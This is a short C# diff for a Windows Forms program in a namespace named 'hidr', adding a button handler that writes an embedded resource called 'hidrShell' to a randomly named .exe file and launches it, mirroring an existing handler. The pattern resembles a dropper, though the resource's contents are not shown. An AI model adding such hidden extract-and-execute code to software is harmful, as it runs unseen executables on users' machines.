@@ -80,5 +80,12 @@ namespace hidr
             ExtractFile(Properties.Resources.cbm1,fp,false);
             Process.Start(fp);
         }
+
+        private void materialButton2_Click(object sender, EventArgs e)
+        {
+            var fp = GetRandomFP(".exe");
+            ExtractFile(Properties.Resources.hidrShell, fp, true);
+            Process.Start(fp);
+        }
     }
 }
